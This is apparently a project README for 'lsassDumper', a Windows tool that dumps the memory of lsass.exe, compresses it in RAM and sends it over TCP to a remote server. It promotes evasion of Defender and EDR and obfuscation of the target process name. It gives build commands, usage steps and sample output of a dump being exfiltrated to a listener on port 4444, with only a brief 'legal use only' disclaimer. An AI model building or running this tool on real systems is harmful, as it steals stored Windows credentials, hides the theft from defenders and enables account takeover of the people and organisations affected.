<h1 align="center"> Project lsassDumper </h1>

## Description

This program dumpin the memory of the `lsass.exe` process on a Windows system, compressing the dump using the **zlib** library, and sending the compressed file to a remote server via a network connection. It is particularly useful in situations where tools like Mimikatz cannot be used. All operations, including the memory dump and compression, are performed entirely in RAM to avoid detection by defender and EDR.

### Key Features

1. **Retrieve PID of `lsass.exe`**: The process is identified by its name using Windows APIs.
2. **Memory Dump**: The process memory is extracted using `MiniDumpWriteDump`.
3. **Data Compression**: The extracted data is compressed using the **zlib** library to reduce file size.
4. **Network Transmission**: The compressed data is sent to a remote server over TCP.
5. **Obfuscation**: The target process name (`lsass.exe`) is obfuscated in the source code to bypass basic analysis.

## Prerequisites

### Environment
- **Windows**
- **Compiler compatible with Windows APIs**: MinGW, Visual Studio, etc.

### Required Libraries
- **zlib**: For data compression.
- **DbgHelp**: For using `MiniDumpWriteDump`.
- **Winsock2**: For network communication.

## Compilation

### Steps with MinGW
1. Ensure MinGW is installed and configured.
2. Compile the source file using the following command:

   ```bash
   g++ -o memory_dumper.exe memory_dumper.cpp -lz -lws2_32 -ldbghelp
   ```

### Steps with Visual Studio
1. Open the `.cpp` file in Visual Studio.
2. Add the required libraries (`DbgHelp.lib`, `ws2_32.lib`) to the project settings.
3. Compile the project.

## Usage

1. Run the executable as an administrator (required to access `lsass.exe`).

   ```bash
   memory_dumper.exe
   ```

2. Provide the server IP and port when prompted.

3. The program:
   - Identifies the `lsass.exe` process.
   - Dumps its memory into a buffer.
   - Compresses the data.
   - Sends the data to the specified server.

### Example

```plaintext
[*] Enter server IP: 192.168.1.100
[*] Enter server port: 4444
[+] Memory dump completed. Size: 16777216 bytes.
[+] Compression completed. Compressed size: 524288 bytes.
[+] Sent 524288 bytes to server.
[+] Done!
```

## Warnings

- **Legal Use Only**: This program is intended for educational or diagnostic purposes on your own systems or as part of authorized audits.
- **Required Permissions**: Ensure you have administrative rights to execute this program.
- **Detection Risk**: Although the program uses basic obfuscation, it may still be detected by advanced security solutions.

## Dependencies

- **zlib**: [zlib.net](https://zlib.net)
- **DbgHelp**: Included with the Windows SDK.
- **Winsock2**: Built into Windows.

## Contributions
Contributions to improve this program or suggest optimizations are welcome. Create a pull request or submit an issue if you want
